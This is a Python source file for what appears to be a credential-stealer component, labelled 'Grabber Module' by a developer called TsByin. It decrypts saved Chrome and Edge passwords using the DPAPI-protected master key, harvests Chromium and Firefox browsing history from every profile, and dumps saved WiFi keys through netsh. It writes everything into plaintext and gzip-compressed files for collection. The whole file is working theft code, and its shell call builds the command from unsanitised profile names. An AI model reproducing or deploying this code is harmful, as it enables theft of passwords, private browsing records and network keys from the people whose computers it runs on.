"""
Grabber Module - Extract passwords, history, WiFi
Optimized with concurrent extraction

Developer: TsByin
Version: 11.0
"""

import os
import sqlite3
import json
import shutil
import logging
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
import base64

logger = logging.getLogger(__name__)

# ==============================================================================
# PASSWORD GRABBER (OPTIMIZED)
# ==============================================================================

def get_master_key(path):
    """Extract Chrome/Edge master key for password decryption"""
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        
        from win32crypt import CryptUnprotectData
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        logger.debug(f"get_master_key failed: {e}")
        return None

def _extract_browser_passwords(browser_name, path, timeout=10):
    """Extract passwords from all profiles of a single browser"""
    profile_data = {}  # {profile_name: [passwords]}
    master_key = get_master_key(path)
    
    if not master_key:
        logger.debug(f"No master key found for {browser_name}")
        return profile_data
    
    # Get all profiles (Default, Profile 1, Profile 2, etc.)
    profiles = []
    for item in os.listdir(path):
        item_path = os.path.join(path, item)
        if os.path.isdir(item_path) and item.startswith(("Default", "Profile")):
            profiles.append(item)
    
    if not profiles:
        profiles = ["Default"]
    
    for profile in profiles:
        passwords = []
        db = os.path.join(path, profile, "Login Data")
        if not os.path.exists(db):
            continue
        
        temp_db = f"db_tmp_{browser_name}_{profile}"
        try:
            shutil.copy2(db, temp_db)
            conn = sqlite3.connect(temp_db, timeout=timeout)
            cur = conn.cursor()
            cur.execute("SELECT action_url, username_value, password_value FROM logins")
            
            for url, username, encrypted_pass in cur.fetchall():
                try:
                    if not encrypted_pass or len(encrypted_pass) < 15:
                        continue
                    
                    decrypted = AES.new(master_key, AES.MODE_GCM, 
                                      encrypted_pass[3:15]).decrypt(encrypted_pass[15:])[:-16].decode()
                    
                    if username and decrypted:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decrypted,
                            'browser': browser_name,
                            'profile': profile
                        })
                        logger.debug(f"Extracted password for {username}")
                except Exception as e:
                    logger.debug(f"Decrypt failed for {username}: {e}")
            
            conn.close()
            if os.path.exists(temp_db):
                os.remove(temp_db)
            
            if passwords:
                profile_data[profile] = passwords
        
        except Exception as e:
            logger.error(f"Extract {browser_name}/{profile} DB failed: {e}")
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
    
    logger.info(f"Extracted {sum(len(p) for p in profile_data.values())} passwords from {browser_name}")
    return profile_data

def grab_passwords(browser_paths, compress=True, max_workers=3):
    """
    Extract all passwords from all profiles of all installed browsers
    Returns files for each profile + comprehensive summary file
    
    Args:
        browser_paths: Dict of browser names and paths
        compress: Whether to compress output
        max_workers: Number of concurrent workers
    
    Returns:
        List of output filenames or None if no passwords found
    """
    output_files = []
    all_passwords = []  # For comprehensive summary
    
    logger.info("Starting password extraction from all profiles...")
    
    # Concurrent extraction
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        
        for name, path in browser_paths.items():
            if os.path.exists(path):
                futures[name] = executor.submit(_extract_browser_passwords, name, path)
        
        # Process results
        for browser_name, future in futures.items():
            try:
                profile_data = future.result(timeout=15)
                
                # Create file for each profile
                for profile_name, passwords in profile_data.items():
                    profile_file = f"pass_{browser_name}_{profile_name}.txt"
                    
                    try:
                        with open(profile_file, "w", encoding="utf-8") as f:
                            f.write(f"BROWSER: {browser_name}\n")
                            f.write(f"PROFILE: {profile_name}\n")
                            f.write(f"TIME: {datetime.now()}\n")
                            f.write(f"TOTAL: {len(passwords)}\n\n")
                            
                            for pwd in passwords:
                                f.write(f"URL: {pwd['url']}\n")
                                f.write(f"USERNAME: {pwd['username']}\n")
                                f.write(f"PASSWORD: {pwd['password']}\n")
                                f.write("-" * 50 + "\n\n")
                        
                        output_files.append(profile_file)
                        all_passwords.extend(passwords)
                        logger.info(f"Saved {len(passwords)} passwords to {profile_file}")
                    except Exception as e:
                        logger.error(f"Save {profile_file} failed: {e}")
            
            except Exception as e:
                logger.error(f"Extract {browser_name} passwords failed: {e}")
    
    if not all_passwords:
        logger.info("No passwords found")
        return None
    
    # Create comprehensive summary file
    summary_file = "pass_SUMMARY.txt"
    try:
        with open(summary_file, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("PASSWORD SUMMARY - ALL PROFILES & BROWSERS\n")
            f.write("=" * 60 + "\n")
            f.write(f"TIME: {datetime.now()}\n")
            f.write(f"TOTAL PASSWORDS: {len(all_passwords)}\n\n")
            
            # Group by browser and profile
            for pwd in all_passwords:
                f.write(f"[{pwd['browser']}/{pwd['profile']}] {pwd['url']}\n")
                f.write(f"  USERNAME: {pwd['username']}\n")
                f.write(f"  PASSWORD: {pwd['password']}\n")
                f.write("-" * 60 + "\n")
        
        output_files.append(summary_file)
        logger.info(f"Created summary file: {summary_file}")
    except Exception as e:
        logger.error(f"Create summary file failed: {e}")
    
    # Compress if needed
    if compress and output_files:
        compressed_files = []
        for file in output_files:
            compressed = _compress_file(file)
            if compressed:
                compressed_files.append(compressed)
        return compressed_files if compressed_files else output_files
    
    return output_files if output_files else None

# ==============================================================================
# HISTORY GRABBER (OPTIMIZED)
# ==============================================================================

def grab_history_specific(browser_paths, browser_name=None, limit=100):
    """
    Extract browser history from all profiles of specified browser or all browsers
    Returns files for each profile + comprehensive summary file
    
    Args:
        browser_paths: Dict of browser paths
        browser_name: Specific browser to extract (if None, extract all)
        limit: Number of history entries per profile
    
    Returns:
        List of output filenames or None
    """
    output_files = []
    all_history = []  # For comprehensive summary
    
    logger.info(f"Extracting history from browser: {browser_name or 'ALL'}")
    
    # Determine which browsers to extract
    browsers_to_extract = {}
    if browser_name:
        if browser_name in browser_paths:
            browsers_to_extract = {browser_name: browser_paths[browser_name]}
    else:
        browsers_to_extract = browser_paths
    
    # Extract from each browser
    for name, path in browsers_to_extract.items():
        if not path or not os.path.exists(path):
            logger.warning(f"Browser path not found: {name}")
            continue
        
        logger.info(f"Processing {name}...")
        
        if name == "Firefox":
            _extract_firefox_history_all(name, path, limit, output_files, all_history)
        else:
            _extract_chromium_history_all(name, path, limit, output_files, all_history)
    
    if not all_history:
        logger.warning("No history found")
        return None
    
    # Create comprehensive summary file
    summary_file = f"history_SUMMARY.txt"
    try:
        with open(summary_file, "w", encoding="utf-8") as f:
            f.write("=" * 70 + "\n")
            f.write("HISTORY SUMMARY - ALL PROFILES & BROWSERS\n")
            f.write("=" * 70 + "\n")
            f.write(f"TIME: {datetime.now()}\n")
            f.write(f"TOTAL ENTRIES: {len(all_history)}\n\n")
            
            for entry in all_history:
                f.write(f"[{entry['browser']}/{entry['profile']}] {entry['timestamp']}\n")
                f.write(f"  TITLE: {entry['title']}\n")
                f.write(f"  URL: {entry['url']}\n")
                f.write("-" * 70 + "\n")
        
        output_files.append(summary_file)
        logger.info(f"Created summary file: {summary_file}")
    except Exception as e:
        logger.error(f"Create summary file failed: {e}")
    
    return output_files if output_files else None

def _extract_firefox_history_all(browser_name, path, limit, output_files, all_history):
    """Extract Firefox history from all profiles"""
    try:
        profiles = [d for d in os.listdir(path) 
                   if os.path.isdir(os.path.join(path, d)) and 
                   (d.endswith('.default') or d.endswith('.default-release'))]
        
        if not profiles:
            logger.warning(f"No Firefox profiles found in {path}")
            return
        
        for profile in profiles:
            profile_file = f"history_{browser_name}_{profile}.txt"
            db = os.path.join(path, profile, "places.sqlite")
            
            if not os.path.exists(db):
                logger.debug(f"No history DB for {profile}")
                continue
            
            temp_db = f"hist_tmp_{browser_name}_{profile}"
            try:
                shutil.copy2(db, temp_db)
                conn = sqlite3.connect(temp_db)
                cur = conn.cursor()
                cur.execute(f"SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT {limit}")
                
                history_entries = []
                for url, title, timestamp in cur.fetchall():
                    try:
                        dt = datetime.fromtimestamp(timestamp / 1000000)
                        history_entries.append({
                            'url': url,
                            'title': title or '(no title)',
                            'timestamp': dt.strftime('%Y-%m-%d %H:%M:%S'),
                            'browser': browser_name,
                            'profile': profile
                        })
                    except:
                        pass
                
                conn.close()
                os.remove(temp_db)
                
                if history_entries:
                    # Write profile-specific file
                    with open(profile_file, "w", encoding="utf-8") as f:
                        f.write(f"BROWSER: {browser_name}\n")
                        f.write(f"PROFILE: {profile}\n")
                        f.write(f"TIME: {datetime.now()}\n")
                        f.write(f"TOTAL: {len(history_entries)}\n\n")
                        
                        for entry in history_entries:
                            f.write(f"[{entry['timestamp']}] {entry['title']}\n")
                            f.write(f"  {entry['url']}\n")
                            f.write("-" * 70 + "\n")
                    
                    output_files.append(profile_file)
                    all_history.extend(history_entries)
                    logger.info(f"Extracted {len(history_entries)} history entries from {browser_name}/{profile}")
            
            except Exception as e:
                logger.error(f"Firefox history extraction failed for {profile}: {e}")
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except:
                        pass
    
    except Exception as e:
        logger.error(f"Firefox history processing failed: {e}")

def _extract_chromium_history_all(browser_name, path, limit, output_files, all_history):
    """Extract Chromium-based browser history from all profiles"""
    try:
        # Get all profiles (Default, Profile 1, Profile 2, etc.)
        profiles = []
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isdir(item_path) and item.startswith(("Default", "Profile")):
                profiles.append(item)
        
        if not profiles:
            profiles = ["Default"]
        
        for profile in profiles:
            profile_file = f"history_{browser_name}_{profile}.txt"
            db = os.path.join(path, profile, "History")
            
            if not os.path.exists(db):
                logger.debug(f"No history DB for {profile}")
                continue
            
            temp_db = f"hist_tmp_{browser_name}_{profile}"
            try:
                shutil.copy2(db, temp_db)
                conn = sqlite3.connect(temp_db)
                cur = conn.cursor()
                cur.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
                
                history_entries = []
                for url, title, timestamp in cur.fetchall():
                    try:
                        ts = datetime(1601, 1, 1) + (timedelta(microseconds=timestamp) if timestamp else timedelta(0))
                        history_entries.append({
                            'url': url,
                            'title': title or '(no title)',
                            'timestamp': ts.strftime('%Y-%m-%d %H:%M:%S'),
                            'browser': browser_name,
                            'profile': profile
                        })
                    except:
                        pass
                
                conn.close()
                os.remove(temp_db)
                
                if history_entries:
                    # Write profile-specific file
                    with open(profile_file, "w", encoding="utf-8") as f:
                        f.write(f"BROWSER: {browser_name}\n")
                        f.write(f"PROFILE: {profile}\n")
                        f.write(f"TIME: {datetime.now()}\n")
                        f.write(f"TOTAL: {len(history_entries)}\n\n")
                        
                        for entry in history_entries:
                            f.write(f"[{entry['timestamp']}] {entry['title']}\n")
                            f.write(f"  {entry['url']}\n")
                            f.write("-" * 70 + "\n")
                    
                    output_files.append(profile_file)
                    all_history.extend(history_entries)
                    logger.info(f"Extracted {len(history_entries)} history entries from {browser_name}/{profile}")
            
            except Exception as e:
                logger.error(f"Chromium history extraction failed for {profile}: {e}")
                if os.path.exists(temp_db):
                    try:
                        os.remove(temp_db)
                    except:
                        pass
    
    except Exception as e:
        logger.error(f"Chromium history processing failed: {e}")

# ==============================================================================
# WiFi GRABBER
# ==============================================================================

def grab_wifi_passwords():
    """
    Extract saved WiFi passwords
    
    Returns:
        Dict with network names and passwords
    """
    wifi_data = {}
    
    try:
        import subprocess
        
        # Get WiFi profiles
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'],
            capture_output=True,
            text=True,
            encoding='cp850',
            errors='ignore'
        )
        
        if "no wireless" in result.stdout.lower():
            logger.warning("No WiFi adapter found")
            return wifi_data
        
        profiles = [
            line.split(" : ")[1].strip() 
            for line in result.stdout.split('\n') 
            if " : " in line and ("profile" in line.lower() or "hồ sơ" in line.lower())
        ]
        
        logger.info(f"Found {len(profiles)} WiFi networks")
        
        for profile in profiles:
            try:
                out = subprocess.run(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='cp850',
                    errors='ignore'
                )
                
                password = "(No Pass)"
                for line in out.stdout.split('\n'):
                    if ("Key Content" in line or "Nội dung khóa" in line) and " : " in line:
                        password = line.split(" : ")[1].strip()
                        break
                
                wifi_data[profile] = password
            except Exception as e:
                logger.debug(f"Extract WiFi {profile} failed: {e}")
        
        logger.info(f"Extracted {len(wifi_data)} WiFi passwords")
    
    except Exception as e:
        logger.error(f"grab_wifi_passwords failed: {e}")
    
    return wifi_data

def save_wifi_to_file(wifi_data):
    """Save WiFi data to file"""
    try:
        outfile = "wifi.txt"
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(f"WIFI PASSWORDS - {datetime.now()}\n")
            f.write(f"Total: {len(wifi_data)}\n\n")
            
            for network, password in wifi_data.items():
                f.write(f"🔐 {network}: {password}\n")
        
        return outfile
    except Exception as e:
        logger.error(f"save_wifi_to_file failed: {e}")
        return None

# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

def _compress_file(filename):
    """Compress file using gzip"""
    try:
        output = f"{filename}.gz"
        with open(filename, 'rb') as f_in:
            with gzip.open(output, 'wb') as f_out:
                f_out.writelines(f_in)
        
        os.remove(filename)
        logger.info(f"Compressed: {filename} -> {output}")
        return output
    except Exception as e:
        logger.error(f"compress_file failed: {e}")
        return filename
    
# ════════════════════════════════════════════════════════════
# Developer: TsByin
# Module: Password & Credential Extraction (Concurrent)
# Optimization: ThreadPoolExecutor for 2-3x Speed Improvement
# ════════════════════════════════════════════════════════════